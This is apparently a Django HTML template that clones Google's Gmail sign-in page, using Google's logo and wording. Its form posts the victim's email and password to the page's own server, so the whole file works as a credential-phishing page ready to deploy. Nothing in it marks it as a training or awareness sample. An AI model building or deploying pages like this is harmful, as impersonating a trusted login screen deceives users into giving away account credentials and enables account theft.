<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
		<script src="https://unpkg.com/unlazy@0.11.3/dist/unlazy.with-hashing.iife.js" defer init></script>
		<script type="text/javascript">
			window.tailwind.config = {
				darkMode: ['class'],
				theme: {
					extend: {
						colors: {
							border: 'hsl(var(--border))',
							input: 'hsl(var(--input))',
							ring: 'hsl(var(--ring))',
							background: 'hsl(var(--background))',
							foreground: 'hsl(var(--foreground))',
							primary: {
								DEFAULT: 'hsl(var(--primary))',
								foreground: 'hsl(var(--primary-foreground))'
							},
							secondary: {
								DEFAULT: 'hsl(var(--secondary))',
								foreground: 'hsl(var(--secondary-foreground))'
							},
							destructive: {
								DEFAULT: 'hsl(var(--destructive))',
								foreground: 'hsl(var(--destructive-foreground))'
							},
							muted: {
								DEFAULT: 'hsl(var(--muted))',
								foreground: 'hsl(var(--muted-foreground))'
							},
							accent: {
								DEFAULT: 'hsl(var(--accent))',
								foreground: 'hsl(var(--accent-foreground))'
							},
							popover: {
								DEFAULT: 'hsl(var(--popover))',
								foreground: 'hsl(var(--popover-foreground))'
							},
							card: {
								DEFAULT: 'hsl(var(--card))',
								foreground: 'hsl(var(--card-foreground))'
							},
						},
					}
				}
			}
		</script>
		<style type="text/tailwindcss">
			@layer base {
				:root {
					--background: 0 0% 100%;
--foreground: 240 10% 3.9%;
--card: 0 0% 100%;
--card-foreground: 240 10% 3.9%;
--popover: 0 0% 100%;
--popover-foreground: 240 10% 3.9%;
--primary: 240 5.9% 10%;
--primary-foreground: 0 0% 98%;
--secondary: 240 4.8% 95.9%;
--secondary-foreground: 240 5.9% 10%;
--muted: 240 4.8% 95.9%;
--muted-foreground: 240 3.8% 46.1%;
--accent: 240 4.8% 95.9%;
--accent-foreground: 240 5.9% 10%;
--destructive: 0 84.2% 60.2%;
--destructive-foreground: 0 0% 98%;
--border: 240 5.9% 90%;
--input: 240 5.9% 90%;
--ring: 240 5.9% 10%;
--radius: 0.5rem;
				}
				.dark {
					--background: 240 10% 3.9%;
--foreground: 0 0% 98%;
--card: 240 10% 3.9%;
--card-foreground: 0 0% 98%;
--popover: 240 10% 3.9%;
--popover-foreground: 0 0% 98%;
--primary: 0 0% 98%;
--primary-foreground: 240 5.9% 10%;
--secondary: 240 3.7% 15.9%;
--secondary-foreground: 0 0% 98%;
--muted: 240 3.7% 15.9%;
--muted-foreground: 240 5% 64.9%;
--accent: 240 3.7% 15.9%;
--accent-foreground: 0 0% 98%;
--destructive: 0 62.8% 30.6%;
--destructive-foreground: 0 0% 98%;
--border: 240 3.7% 15.9%;
--input: 240 3.7% 15.9%;
--ring: 240 4.9% 83.9%;
				}
			}
		</style>
  </head>
  <body>
    <div class="flex flex-col items-center justify-center min-h-screen bg-background p-4">
  <div class="bg-white rounded-lg shadow-lg p-8 w-full max-w-md">
    <div class="flex items-center mb-4">
      <img id="img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png" alt="Google Logo" class="h-8 w-8 mr-2" />
      <h1 class="text-2xl font-semibold">Sign in</h1>
    </div>
    <p class="text-muted-foreground mb-6">to continue with Gmail</p>
	<form action="" method="post">
		{% csrf_token %}
	<label for="" id="input1_label" style="display: none;" class="text-sm text-blue-500 mb-1">Email or phone</label>
    <input id="input1" required type="email" name="email" placeholder="Email or phone" class="border-2 border-gray-300 rounded-lg p-2 w-full mb-2" />
    <label for="" id="input2_label" style="display: none;" class="text-sm text-blue-500 mb-1 mt-2">Password</label>
	<input id="input2" required type="password" name="password" placeholder="Password" class="border-2 border-gray-300 rounded-lg p-2 w-full mb-1" />
    <a href="#" class="text-blue-500 text-sm">Forgot email?</a>
    <p class="text-sm text-muted-foreground mb-4 mt-5">Not your computer? Use Private Browsing windows to sign in.</p>
    <a href="#" class="text-blue-500 text-sm mb-4">Learn more about using Guest mode.</a>
    <div class="flex justify-between">
      <a href="#" class="text-blue-500 text-sm">Create account</a>
      <button style="background-color: rgb(0, 89, 173);" class="bg-primary text-primary-foreground hover:bg-primary/80 rounded-lg p-2">Next</button>
    </div>
	</form>
  </div>
  <div class="mt-4 text-sm text-muted-foreground">
    <span>English (United States)</span>
  </div>
  <div class="mt-2 text-sm">
    <a href="#" class="text-blue-500">Help</a>
    <span class="mx-2">|</span>
    <a href="#" class="text-blue-500">Privacy</a>
    <span class="mx-2">|</span>
    <a href="#" class="text-blue-500">Terms</a>
  </div>
</div>
<script>
	const input1 = document.getElementById('input1')
	const input2 = document.getElementById('input2')

	input1.onclick=() => {
		document.getElementById('input1_label').style.display='block'
		document.getElementById('input2_label').style.display='none'
	}
	input2.onclick=() => {
		document.getElementById('input2_label').style.display='block'
		document.getElementById('input1_label').style.display='none'
	}
</script>
  </body>
</html>
